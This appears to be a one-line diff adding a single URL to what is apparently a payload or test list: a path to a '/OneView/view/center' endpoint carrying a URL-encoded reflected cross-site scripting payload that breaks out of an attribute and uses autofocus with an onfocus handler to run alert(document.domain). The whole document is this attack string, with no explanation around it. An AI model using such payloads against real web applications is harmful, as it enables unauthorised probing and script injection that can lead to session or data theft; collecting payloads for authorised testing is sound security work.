@@ -1,0 +1,1 @@
+/OneView/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)
